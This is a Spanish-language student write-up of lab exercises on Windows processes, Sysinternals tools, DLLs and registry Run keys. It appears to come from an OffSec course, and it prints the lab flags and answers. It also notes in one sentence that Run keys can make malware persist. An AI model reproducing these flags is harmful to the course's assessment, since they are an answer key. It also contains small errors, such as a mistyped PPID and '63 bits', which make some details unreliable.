    /U    [domain\]user    Specifies the user context under which the
                           command should execute.

    /P    [password]       Specifies the password for the given user
                           context. Prompts for input if omitted.
[...]
```

<br />

**Exercises**

**1. ¿Qué proceso es responsable del manejo de logeo en Windows?

Winlogon.exe

<br />

**2. Qué proceso ejecuta el Windows GUI shell?**

Explorer.exe

<br />

**3. ¿Qué opción puede usarse para filtrarse con 'tasklist'?

/FI

<br />

**4. Qué procesos tiene siempre el PID de 4?**

SYSTEM

<br />

**5.  Nos conectamos a través de ssh con el usuario Offsec:Offsec. ¿Qué usuarios son responsables del proceso Calculator.exe?**

En primer lugar, introducimos el siguiente comando para que 'tasklist' nos de información sobre el proceso en cuestión:

```
offsec@WINDOWS-03 C:\Users\Offsec>tasklist /FI "IMAGENAME eq Calculator.exe"   

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
Calculator.exe                 368 Console                    1     20,380 K
```

No tenemos la información que buscamos con lo que desplegamos la ayuda de 'tasklist' para ver qué nos puede proporcionar:

```
offsec@WINDOWS-03 C:\Users\Offsec>tasklist /?                                  

TASKLIST [/S system [/U username [/P [password]]]]
         [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH]

Description:
    This tool displays a list of currently running processes on
    either a local or remote machine.

[...]

  /V                      Displays verbose task information.

[...]
```

De esta forma, podemos recibir más información con '/v' así, modificamos el primer comando y obtenemos:

```
offsec@WINDOWS-03 C:\Users\Offsec>tasklist /FI "IMAGENAME eq Calculator.exe" /v 

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name
                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== =========================
========================= ============ ========================================================================       
Calculator.exe                 368 Console                    1     20,384 K Unknown         WINDOWS-03\Runner 
```


Y vemos que el usuario es WINDOWS-03\\Runner.

<br />

**6. Termina el proceso Calculator.exe. Seguidamente ejecuta el binario *proc01.exe* en el escritorio del usuario Offsec para obtener la flag.**

```
offsec@WINDOWS-03 C:\Users\Offsec>tasklist /FI "IMAGENAME eq Calculator.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
Calculator.exe                 368 Console                    1     20,620 K

offsec@WINDOWS-03 C:\Users\Offsec>taskkill /PID 368                         
ERROR: The process with PID 368 could not be terminated.
Reason: This process can only be terminated forcefully (with /F option).

offsec@WINDOWS-03 C:\Users\Offsec>taskkill /F /PID 368 
SUCCESS: The process with PID 368 has been terminated.
```

<br />

**7. Termina los siguientes procesos que se ejecutan en el contexto del usuario Runner: iexplore.exe, 7zFM.exe, and notepad++.exe**.

Acudimos a la CMD del usuario y empleamos el siguiente comando para filtrar los servicios que nos interesa  

```
offsec@WINDOWS-03 C:\Users\Offsec>tasklist /S localhost /U WINDOWS-03\Runner /v | findstr "iexplore 7zFM notepad"
7zFM.exe                      5600 Console                    1     17,292 K Unknown         WINDOWS-03\Runner        
                               0:00:00 N/A
iexplore.exe                  6508 Console                    1     40,264 K Unknown         WINDOWS-03\Runner        
                               0:00:00 N/A
iexplore.exe                  4684 Console                    1     45,892 K Unknown         WINDOWS-03\Runner        
                               0:00:00 N/A
notepad++.exe                 7096 Console                    1     34,956 K Unknown         WINDOWS-03\Runner  
```

De esta forma, ya disponemos de los PIDs que nos interesan, empleamos 'taskkill':

```
offsec@WINDOWS-03 C:\Users\Offsec>taskkill /F /PID 5600 && taskkill /F /PID 6508 && taskkill /F /PID 7096 
SUCCESS: The process with PID 5600 has been terminated.
SUCCESS: The process with PID 6508 has been terminated.
SUCCESS: The process with PID 7096 has been terminated.
```

Y recuperamos la flag.

```
offsec@WINDOWS-03 C:\Users\Offsec>Desktop\proc02.exe 
Nice! Your flag is:
OS{those-processes-did-not-stand-a-chance}
```

<br />

**8. Existe un proceso 'child' llamado *cmd.exe* que se esta ejecutándo bajo el contexto de usuario *Runner*. Identifica el PID de ese proceso y usalo para localizar el parent process**

En primer lugar, localizamos el PID del proceso en cuestión con el siguiente comando:

```
offsec@WINDOWS-03 C:\Users\Offsec>tasklist /S localhost /U Runner /FI "ImageName eq cmd.exe" /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name
                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== =========================
========================= ============ ========================================================================       
cmd.exe                       7540 Console                    1      3,624 K Unknown         WINDOWS-03\Runner        
                               0:00:00 N/A
cmd.exe                       1952 Services                   0      4,520 K Unknown         WINDOWS-03\Offsec 
```

Aunque a priori nos salgan dos procesos, como hemos incluido la opción de verbalizar (/v) podemos discernir cuál pertenece a Runner. Seguidamente utilizamos el siguiente comando para buscar el parent process con WMIC:

```
offsec@WINDOWS-03 C:\Users\Offsec>wmic process get processid,parentprocessid,executablepath|findstr "cmd.exe 7540"   
C:\Windows\System32\cmd.exe
        7348             7540
C:\WINDOWS\system32\conhost.exe
        7540             7548
c:\windows\system32\cmd.exe
        2656             1952
```

Vemos así que el proceso con PID 7540 que tiene por nombre de imagen cmd.exe tiene un PPID (Parent Process ID), de 7438. Así, lo localizamos con 'tasklist':

```
offsec@WINDOWS-03 C:\Users\Offsec>tasklist /FI "PID eq 7348"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
SuspendProcess.exe            7348 Console                    1      8,088 K
```

<br />

**Sysinternals Process Utilities**

La Suite Sysinternals contiene varias herramientas que pueden ayudarnos a administrar y analizar procesos. (RECORDAMOS QUE AL SER HERRAMIENTAS DE SYSINTERALS LA PRIMERA VEZ QUE EJECUTEMOS ESTOS BINARIOS DEBEMOS ACCEPTAR LOS EULA)

```
C:\> pslist /accepteula
```

<br />

- *pslist*

La herramienta *pslist* es como una versión mejorada y más detallada de la lista de tareas. Verifiquemos la información de uso con el parámetro /?:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>pslist /?

PsList v1.4 - Process information lister
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Usage: pslist [-d][-m][-x][-t][-s [n] [-r n] [\\computer [-u username][-p password][name|pid]
   -d          Show thread detail.
   -m          Show memory detail.
   -x          Show processes, memory information and threads.
   -t          Show process tree.
   -s [n]      Run in task-manager mode, for optional seconds specified.
               Press Escape to abort.
   -r n        Task-manager mode refresh rate in seconds (default is 1).
   \\computer  Specifies remote computer.
   -u          Optional user name for remote login.
   -p          Optional password for remote login. If you don't present
               on the command line pslist will prompt you for it if necessary.
   name        Show information about processes that begin with the name
               specified.
   -e          Exact match the process name.
   -nobanner   Do not display the startup banner and copyright message.
   pid         Show information about specified process.

All memory values are displayed in KB.
Abbreviation key:
   Pri         Priority
   Thd         Number of Threads
   Hnd         Number of Handles
   VM          Virtual Memory
   WS          Working Se
   Priv        Private Virtual Memory
   Priv Pk     Private Virtual Memory Peak
   Faults      Page Faults
   NonP        Non-Paged Pool
   Page        Paged Pool
   Cswtch      Context Switches
```

Ejecutar 3el comando sin argumentos produce una tabla como la siguiente:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>pslist

PsList v1.4 - Process information lister
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Process information for Offsec-Machine:

Name                Pid Pri Thd  Hnd   Priv        CPU Time    Elapsed Time
Idle                  0   0   8    0     60    46:18:25.765     6:07:07.039
System                4   8 175 3721    196     0:03:07.734     6:07:07.039
Registry            124   8   4    0   7288     0:00:02.734     6:07:08.716
smss                428  11   3   53   1096     0:00:00.187     6:07:07.030
csrss               628  13  15  503   2060     0:00:01.421     6:07:02.237
wininit             780  13   2  161   1476     0:00:01.625     6:07:01.361
csrss               788  13  15  623   2612     0:01:54.265     6:07:01.358
winlogon            888  13   5  276   2944     0:00:00.156     6:07:01.093
services            948   9   8  682   5368     0:00:03.812     6:06:58.275
lsass               968   9  10 1412   8564     0:00:03.421     6:06:58.238
svchost             668   8  22 1486  11432     0:00:06.406     6:06:57.973
...
```

El resultado del ejemplo anterior ya es bastante detallado en comparación con el de la lista de *tasklist*. Podemos usar la opción '-d' para mostrar información sobre los hilos que se ejecutan dentro de los procesos:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>pslist -d

PsList v1.4 - Process information lister
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Thread detail for Offsec-Machine:


Idle 0:
 Tid Pri    Cswtch            State     User Time   Kernel Time   Elapsed Time
   0   0  20580704          Running  0:00:00.000   5:41:55.015    0:00:00.000
   0   0   8235058          Running  0:00:00.000   6:01:26.484    0:00:00.000
   0   0  29415466          Running  0:00:00.000   5:44:02.046    0:00:00.000
   0   0  12082713          Running  0:00:00.000   6:03:30.343    0:00:00.000
   0   0  23820755          Running  0:00:00.000   5:53:34.890    0:00:00.000
   0   0   9787052          Running  0:00:00.000   6:00:18.078    0:00:00.000
   0   0  16211835          Standby  0:00:00.000   5:56:35.640    0:00:00.000
   0   0   7401098          Running  0:00:00.000   5:42:20.578    0:00:00.000

System 4:
 Tid Pri    Cswtch            State     User Time   Kernel Time   Elapsed Time
  12  13       180   Wait:Executive  0:00:00.000   0:00:00.000 3685291:31:42.659
  16  15        74   Wait:Executive  0:00:00.000   0:00:00.015 3685291:31:42.659
  20  15        46   Wait:Executive  0:00:00.000   0:00:00.000 3685291:31:42.659
  24  16        12   Wait:Executive  0:00:00.000   0:00:00.000 3685291:31:42.659
```

Podemos ver los subprocesos que se ejecutan en los procesos Idle y System.

La opción -t nos proporciona una salida similar a un árbol que expone las relaciones padre-hijo. Experimentemos con esto usando nuestra sesión cmd.exe actual para invocar otro símbolo del sistema y luego usemos pslist -t para analizar los resultados:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>cmd
Microsoft Windows [Version 10.0.19041.985]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Offsec\Downloads\SysinternalsSuite>pslist -t

PsList v1.4 - Process information lister
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Process information for Offsec-Machine:
...
  cmd                          13352   8   2   85 4194303    5496    3452
    cmd                         6132   8   3   73 4194303    4620    4392
      pslist                   11292  13   4  222   62992    8484    3292
    conhost                    12772   8   7  320 4194303   26360   14436
...
```

Podemos ver que el cmd.exe recién invocado es un elemento secundario del original. Además, muestra que en tiempo de ejecución, era el padre de pslist.

<br />

- *pskill*

Así como Sysinternals tiene un equivalente para tasklist, también lo tiene para taskkill. Podemos usar la herramienta pskill para finalizar procesos locales y remotos proporcionándole un PID o nombre.

Eliminemos la segunda sesión de cmd.exe:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>pskill 6132

PsKill v1.16 - Terminates processes on local or remote systems
Copyright (C) 1999-2016  Mark Russinovich
Sysinternals - www.sysinternals.com

Process 6132 killed.

C:\Users\Offsec\Downloads\SysinternalsSuite>pslist -t |find "cmd"
  cmd                          13352   8   2   86 4194303    5600    4216
```

En el ejemplo anterior proporcionamos pskill con el PID del segundo símbolo del sistema, que finaliza el shell. Luego verificamos dos veces con pslist que solo se está ejecutando una instancia de cmd.exe.

<br />

- *pssuspend*

Podemos usar *pssuspend* para suspender o reanudar un proceso en un sistema local o remoto. Esto es útil para situaciones en las que preferimos detener temporalmente un proceso, en lugar de eliminarlo por completo. Si no proporcionamos opciones al comando, suspenderá el proceso proporcionado, y si proporcionamos el modificador -r, reanudará el proceso proporcionado.

Si proporcionamos psuspend con un ID de proceso específico, suspenderá o reanudará ese proceso en particular, pero si le proporcionamos el nombre del proceso, suspenderá o reanudará cada instancia del proceso.

Por ejemplo, para suspender y luego reanudar el proceso chrome.exe podemos escribir:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>pssuspend chrome.exe

PsSuspend v1.07 - Process Suspender
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals

Process chrome.exe suspended.

C:\Users\Offsec\Downloads\SysinternalsSuite>pssuspend -r chrome.exe

PsSuspend v1.07 - Process Suspender
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals

Process chrome.exe resumed.
```

<br />

- *listdlls*

Finalmente, cubramos una utilidad relacionada con las DLL. Podemos usar el comando listdlls para verificar qué archivos DLL son llamados por varios procesos. Ejecutemos listdlls sin argumentos. Tendremos que usar C + c para detener el comando, ya que de lo contrario se ejecutará durante algún tiempo:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>listdlls

Listdlls v3.2 - Listdlls
Copyright (C) 1997-2016 Mark Russinovich
Sysinternals

...

winlogon.exe pid: 888
Command line: winlogon.exe

Base                Size      Path
0x000000001a840000  0xe3000   C:\WINDOWS\system32\winlogon.exe
0x0000000063970000  0x1f5000  C:\WINDOWS\SYSTEM32\ntdll.dll
0x0000000063140000  0xbd000   C:\WINDOWS\System32\KERNEL32.DLL
...
```

Observamos que expresa que winlogon.exe está llamando código desde ntdll.dll y KERNEL32.DLL .

Podemos usar la opción -u para listar cualquier DLL sin firmar. Esto puede ser útil para ubicar cualquier código potencialmente no confiable que se esté ejecutando en el sistema:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>listdlls -u

Listdlls v3.2 - Listdlls
Copyright (C) 1997-2016 Mark Russinovich
Sysinternals

...

unsigned.exe pid: 4992
Command line: "unsigned.exe"

Base                Size      Path
0x0000000080000000  0x5000    C:\WINDOWS\system32\Unsigned2.dll
        Verified:       Unsigned
        Publisher:      2021-03-18 Offsec
        Description:    Example Unsigned DLL
        Product:        PEN-100
        Version:        1.3.3.7
        File version:   1.3.3.7
        Create time:    Sun Mar 18 20:11:25 2021
```

<br />

**Exercises 5.4.2.**

**1. Continua la ejecución del proceso suspendido 'wicked.exe' para obtener la flag. Esta quedará escrita sobre C:\\Users\\Offsec\\Desktop\\flag.txt**

Como sabemos que el proceso ya está suspendido. Obtenemos su PID mediante ps y luego lo reestablecemos con *pssuspend*:

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>pslist | findstr wicked
wicked             7628   8   5  170  15468     0:00:00.093   360:19:15.975

offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>pssuspend /r 7628

PsSuspend v1.07 - Process Suspender     
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals

Process 7628 resumed.

offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>type ..\..\Desktop\flag.txt
OS{no-rest-for-the-wicked}
```


<br />

**2. Usa la utilidad *listdlls* para encontrar un programa editado por Igor Pavlov. ¿Cuál es el nombre del programa?**

Vamos a utilizar powershell para resovler este problema:

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>powershell ".\listdlls.exe -v | Select-String -Pattern Igor -Context 2,4" 

  0x0000000000310000  0xd8000   C:\Program Files\7-Zip\7zFM.exe
        Verified:       Unsigned
>       Publisher:      Igor Pavlov
        Description:    7-Zip File Manager
        Product:        7-Zip
        Version:        19.0.0.0
        File version:   19.0.0.0

```

Con esto utilizamos el parámetro '-context' para obtener más líneas a raíz de la línea que tenga un macth para un patrón (-pattern) del comando Select-String.

De esta forma, el nombre del programa es '7zFM.exe'.

<br />

**3. Cuál es el parent process del proceso 'services.exe'?

En primer lugar, utilizamos pslist para obtener información acerca de cualquier sproceso que tenga por nombre 'services':

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>pslist services

PsList v1.4 - Process information lister
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Process information for WINDOWS-03:

Name                Pid Pri Thd  Hnd   Priv        CPU Time    Elapsed Time 
services            672   9   6  390   3836     0:00:01.984   360:42:43.706
```

Vemos que el PID es 672 y llevamos esta información sobre la utilidad WMIC:

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>wmic process where (processid=672) get parentprocessid
ParentProcessId  
564
```

Ahora que tenemos el PPID, lo buscamos de nuevo con pslist:

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>pslist 564     

PsList v1.4 - Process information lister
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Process information for WINDOWS-03:

Name                Pid Pri Thd  Hnd   Priv        CPU Time    Elapsed Time 
wininit             564  13   1  162   1324     0:00:00.062   360:43:52.869
```

Así, el nombre del parent process es *wininit,exe*.

<br />


#### 1.10. Windows Libraries.

Las *librerias* son depósitos de funciones que se pueden importar fácilmente a otros programas. Windows utiliza bibliotecas de vínculos dinámicos (DLL), que están escritas en el mismo formato que los archivos .exe. Estas librerias están orientadas al reciclaje de código de forma que muchos programas hacen un uso compartido de la misma librería. Windows utiliza una cantidad significativa de bibliotecas compartidas, que se denominan DLL. Las DLL contienen código y datos que pueden ser llamados al mismo tiempo por más de un programa. Las DLL esencialmente permiten que un programa recurra a la funcionalidad ya escrita en lugar de tener que realizar esas funciones por sí mismo.

En las versiones de Windows de 64 bits, las DLL y los ejecutables del sistema se almacenan en los directorios *System32* y *SysWOW64*. Como mencionamos en una sección anterior, System32 contiene librerias de 64 bits y SysWOW64 contiene librerias de 32 bits. En la versión de Windows de 32 bits, todas las bibliotecas de todo el sistema se encuentran en System32 .

Repasemos una breve lista de archivos DLL comunes de Windows y su funcionalidad básica:

- *HAL.DLL*: Hardware Abstraction Layer, es un kernel-mode library file y no puede ser utilizado por ningún programa en user-mode. Realiza múltiples funciones relacionadas con el hardware subyacente del sistema.

- *NTDLL.DLL*: El New-Technology DLL permite que los programas en user-mode recurran a la *API nativa* de Windows. La API nativa se usa cuando otras API más sólidas no están disponibles, como durante el inicio del sistema. Por ejemplo, el csrss.exe antes mencionado recurre a la funcionalidad de la libreria NTDLL.DLL .

- *KERNEL32.DLL*: esta DLL permite que las aplicaciones recurran a la mayoría de las API base de Win32 que involucran cosas como administración de memoria, operaciones de entrada y salida, y más. Como ejemplo de cómo otro código puede usar las DLL, KERNEL32.DLL implementa gran parte de su funcionalidad llamando al código NTDLL.DLL.

- *USER32.DLL*: permite que las aplicaciones invoquen objetos que componen la interfaz de usuario, como el escritorio, la barra de tareas y el menú Inicio.

- *ADVAPI32.DLL*: permite que las aplicaciones invoquen funciones de seguridad y funciones que manipulan el Registro. 

<br />

**Exercises 5.5.1**

**1 Cuál es la extensión de las librerias de Windows?**

.dll

<br />

**2. Cuál es la path completo del directorio en elq ue se guradan librerias que comparten aplicaciones de 32-bits en sistemas de 63 bits?**

C:\\Windows\\SysWOW64

<br />

**3. El binario C:\\Users\\Offsec\\Desktop\\OSProc\\OSProc.exe requiere una DLL para ejecutarse. El nombre de la libreria es *OSLib.dll*, pero falta en el directorio del binario. Localice la DLL que falta en el sistema de archivos y vuelva a moverla al directorio OSProc. Luego vuelva a ejecutar el binario para obtener la bandera.

Localizamos con el comando 'dir' el fichero:

```
offsec@WINDOWS-03 C:\>dir /s /a /b | findstr OSLib.dll
C:\Windows\System32\OSLib.dll
```

Seguidamente, copiamos y ejecutamos el binario:

```
offsec@WINDOWS-03 C:\>copy C:\Windows\System32\OSLib.dll C:\Users\Offsec\Desktop\OSProc && C:\Users\Offsec\Desktop\OSProc\OSProc.exe
        1 file(s) copied.
You got it! Your flag is:
OS{your-library-is-in-this-castle!}
```

<br />

**4.  ¿Cuál es la fecha en que se creó la versión de 64 bits de netapi32.dll? (Formato = MM/DD/AAAA)**

Primero localizamos la DLL, como es una dll de 64 bits, la localizaremos por defecto en C:\\Windows\\System32, explorando la ayuda de 'dir' observamos que podemos ver cuándo se ha creado un fichero con la opción /4:

```
ffsec@WINDOWS-03 C:\Windows\System32>dir /4 netapi32.dll 
 Volume in drive C has no label.
 Volume Serial Number is 8EBB-A760

 Directory of C:\Windows\System32

09/20/2021  06:02 PM            82,176 netapi32.dll
               1 File(s)         82,176 bytes
               0 Dir(s)   6,788,792,320 bytes free
```


<br />

#### 1.11. Windows Registry.

**Introducción a Windows Registry**

*Definición*

Ahora vamos a aprender lo que es el Windows Registry o Registro de Windows. *Este es una pieza fundamental del sistema operativo que actúa como una base de datos central para el mismo.*

Es importante entender el Registro desde un punto de vista de la ciberseguridad debido a que almacena información crítica para el sistema.

A través del Registro:

- Podemos acceder tanto a la información del sistema como a la información del usuario.

- Podemos usarlo para controlar qué servicios y aplicaciones se ejecutan en el sistema.

*Registry's Keys & Values*

La unidad básica de datos dentro del Registro se denomina *key*, que es similar a un directorio. El Registro utiliza una estructura jerárquica, por lo que cada clave puede contener subclaves (subdirectorios adicionales), pero también pueden contener valores específicos. A su vez, cada valor tiene un *name* (nombre), un *data type* (tipo de datos), y *data content* (contenido).

Cuando una aplicación quiere escribir datos en el registro, necesita abrir la key correspondiente. Para abrir una key, la aplicación debe proporcionar el nombre de la key deseada a otra key ya abierta. Podríamos preguntarnos si esto parece un poco circular: para abrir keys parece que necesitamos abrir keys.

Windows resuelve esta aparente paradoja con el concepto de *predefined keys*. Las keys predefinidas se inician y permanecen abiertas, por lo que las aplicaciones siempre pueden invocarlas. Aquí hay una lista de algunas de las keys predefinidas y una breve descripción:

- *HKEY_CLASSES_ROOT (HKCR)*: Proporciona información relacionada con los *files types* y sus propiedades. Los subdirectorios (subkeys) bajo HKCR a menudo son utilizadas por aplicaciones de shell (como CMD) y Component Object Model applications (COM).

- *HKEY_CURRENT_CONFIG (HKCC)*: Proporciona información relacionada con las configuraciones de hardware en las que se ejecuta el sistema operativo, específicamente en comparación con la configuración predeterminada.

- *HKEY_CURRENT_USER (HKCU)*: Proporciona información relacionada con las configuraciones o ajustes del usuario actual. Tenga en cuenta que la key y las subkeys de HKCU serán diferentes según el usuario que haya iniciado sesión, incluido SYSTEM.

- *KEY_LOCAL_MACHINE*: Proporciona información sobre la máquina local relacionada con los dispositivos INPUT/OUTPUT, la memoria y los controladores y también sobre SAM (Security Account Manager) o System.

- *HKEY_PERFORMANCE_DATA*: Proporciona información relacionada con el rendimiento del sistema (system performance). En particular, los datos asociados con esta key no se almacenan dentro del Registro en sí, sino que son referenciadas por las *Registry functions* (funciones del registro).

- *HKEY_USERS*: Proporciona información relacionada con la configuración predeterminada asignada a los nuevos usuarios.

Para organizar mejor las keys y subkeys, el Registro emplea el concepto de las *hives* (arboles). Una hive o colmena es un conjunto de keys y valores. Cada hive tiene archivos específicos asociados que se cargan en la memoria cuando se abre, por ejemplo, cuando se inicia el sistema o cuando un usuario se autentica.

Microsoft proporciona la siguiente tabla, que enumera las hives estándar y sus archivos correspondientes:

|Registry Hive|Supporting Files|
|-|-|
|HKEY_CURRENT_CONFIG|System, System.alt, System.log, System.sav|
|HKEY_CURRENT_USER|Ntuser.dat, Ntuser.dat.log|
|HKEY_LOCAL_MACHINE\\SAM|Sam, Sam.log, Sam.sav|
|HKEY_LOCAL_MACHINE\\Security|Security, Security.log, Security.sav|
|HKEY_LOCAL_MACHINE\\Software|Software, Software.log, Software.sav|
|HKEY_LOCAL_MACHINE\\System|System, System.alt, System.log, System.sav|
|HKEY_USERS\\.DEFAULT|Default, Default.log, Default.sav|

<br />

**Valores del Windows Registry**

Ahora que hemos aprendido un poco sobre la organización y la estructura del Registro, podemos utilizar las herramientas de Windows para interactuar con valores específicos del registro.

Hay demasiados valores clave diferentes para cubrir aquí. Señalaremos algunos de ellos y luego aplicaremos algunas de las herramientas que incluye Windows para acceder a las claves, crear claves y valores y eliminar valores. También hablaremos sobre la *exportación*, que será muy importante desde una perspectiva de seguridad.

<br />

*Run & RunOnce*

*Run* y *RunOnce* son dos claves del registro quen permiten que las aplicaciones se ejecuten con la autenticación del usuario. En pocas palabras, cualquier programa que se especifique como valor de una de estas claves se iniciará una vez que el usuario inicie sesión ya sea siempre que el usuario se logee o sólo la siguiente vez. Se pueden incluir varios programas dentro del valor de una clave dada.

De forma predeterminada, hay cuatro claves Run y ​​RunOnce, que residen en HKEY_LOCAL_MACHINE y HKEY_CURRENT_USER:

- HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 
- HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

- HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 
- HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

La diferencia entre las claves Run y ​​RunOnce es que los valores de esta última se eliminarán de la clave tan pronto como se ejecuten los programas.

*Observemos la importancia que representan estas claves de cara a conseguir permanenica introduciendo en una de las dos un malware malicioso.*
<br />

*Regedit & Reg*

Podemos usar tanto la CLI como la GUI para interactuar con el Registro. 

El editor de GUI del registro se puede abrir con el comando *regedit*; sin embargo, en esta sección, nos centraremos en usar la CMD para seguir familiarizándonos y sintiéndonos cómodos con él.

Usemos el comando *reg* para interactuar con el Registro y mostrar los valores de las claves Run y ​​RunOnce. Revisemos los subcomandos de *reg*. Se puede acceder a ellos con reg /? :

```
C:\>reg /?

REG Operation [Parameter List]

  Operation  [ QUERY   | ADD    | DELETE  | COPY    |
               SAVE    | LOAD   | UNLOAD  | RESTORE |
               COMPARE | EXPORT | IMPORT  | FLAGS ]

Return Code: (Except for REG COMPARE)

  0 - Successful
  1 - Failed

For help on a specific operation type:

  REG Operation /?

Examples:

  REG QUERY /?
  REG ADD /?
  REG DELETE /?
  REG COPY /?
  REG SAVE /?
  REG RESTORE /?
  REG LOAD /?
  REG UNLOAD /?
  REG COMPARE /?
  REG EXPORT /?
  REG IMPORT /?
  REG FLAGS /?
  
C:\>
```

El resultado del listado 31 describe una larga lista de acciones que podemos realizar con el registro. Sigamos las instrucciones y encontremos el uso del subcomando *query*:

```
REG QUERY KeyName [/v [ValueName] | /ve] [/s]
          [/f Data [/k] [/d] [/c] [/e]] [/t Type] [/z] [/se Separator]
          [/reg:32 | /reg:64]

  KeyName  [\\Machine\]FullKey
           Machine - Name of remote machine, omitting defaults to the
                     current machine. Only HKLM and HKU are available on
                     remote machines
           FullKey - in the form of ROOTKEY\SubKey name
                ROOTKEY - [ HKLM | HKCU | HKCR | HKU | HKCC ]
                SubKey  - The full name of a registry key under the
                          selected ROOTKEY

  /v       Queries for a specific registry key values.
           If omitted, all values for the key are queried.

           Argument to this switch can be optional only when specified
           along with /f switch. This specifies to search in valuenames only.

  /ve      Queries for the default value or empty value name (Default).

  /s       Queries all subkeys and values recursively (like dir /s).

  /se      Specifies the separator (length of 1 character only) in
           data string for REG_MULTI_SZ. Defaults to "\0" as the separator.

  /f       Specifies the data or pattern to search for.
           Use double quotes if a string contains spaces. Default is "*".

  /k       Specifies to search in key names only.

  /d       Specifies the search in data only.

  /c       Specifies that the search is case sensitive.
           The default search is case insensitive.

  /e       Specifies to return only exact matches.
           By default all the matches are returned.

  /t       Specifies registry value data type.
           Valid types are:
             REG_SZ, REG_MULTI_SZ, REG_EXPAND_SZ,
             REG_DWORD, REG_QWORD, REG_BINARY, REG_NONE
           Defaults to all types.

  /z       Verbose: Shows the numeric equivalent for the type of the valuename.

  /reg:32  Specifies the key should be accessed using the 32-bit registry view.

  /reg:64  Specifies the key should be accessed using the 64-bit registry view.
...

C:\>
```

A continuación, veamos si podemos consultar los valores de las claves Run y ​​RunOnce para nuestro usuario actual:

```
C:\>reg query hkcu\software\microsoft\windows\currentversion\runonce

C:\>reg query hkcu\software\microsoft\windows\currentversion\run

HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run
    OneDrive    REG_SZ    "C:\Users\OffSec\AppData\Local\Microsoft\OneDrive\OneDrive.exe" 
    
C:\>
```

El ejemplo anterior muestra que el valor RunOnce está establecido en vacío. 

Por otro lado, HKCU contiene un único valor para Ejecutar, "OneDrive.exe". Esto significa que OneDrive.exe se inicia al iniciar sesión el usuario actual. La segunda columna de la salida contiene la cadena *"REG_SZ". Esta columna se utiliza para indicar el tipo de datos del valor dado. Por ejemplo, REG_SZ identifica una cadena terminada en nulo, lo que significa que el valor debe ser texto.*

A continuación, usemos reg para eliminar el valor "OneDrive.exe" de la tecla Ejecutar de HKCU.

```
C:\>reg delete hkcu\software\microsoft\windows\currentversion\run /va
Delete all values under the registry key HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run (Yes/No)? yes
The operation completed successfully.

C:\>reg query hkcu\software\microsoft\windows\currentversion\run

C:\>
```

Usamos la opción /va para eliminar todos los valores de la clave indicada. Tenga en cuenta que *reg* nos pide que confirmemos explícitamente la eliminación. Siempre asegúrese de verificar dos y tres veces al modificar el registro.

De manera similar, podemos usar el subcomando *reg add* para agregar valores a una clave. Podemos volver a dar a *OneDrive.exe* las funciones de inicio que le corresponden añadiéndolo de nuevo a la tecla Ejecutar de HKCU:

```
C:\>reg add hkcu\software\microsoft\windows\currentversion\run /v OneDrive /t REG_SZ /d "C:\Users\Offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
The operation completed successfully.

C:\>reg query hkcu\software\microsoft\windows\currentversion\run

HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run
    OneDrive    REG_SZ    C:\Users\Offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe

C:\>
```

Usamos la opción /v para nombrar el valor, /t para especificar su tipo de datos y /d para proporcionar los datos. También podemos usar _reg add_ para crear una clave completamente nueva.

Finalmente, cubramos el concepto de exportar claves. Podemos guardar una clave completa o una hive en un archivo con el comando *reg export*:

```
C:\>reg export hkcu\environment environment
The operation completed successfully.

C:\>type environment
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\environment]
"Path"=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,4c,\
  00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,4c,00,
  6f,00,63,00,61,00,6c,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,73,00,6f,00,66,
  00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,41,00,70,00,70,00,
  73,00,3b,00,00,00
"TEMP"=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,4c,
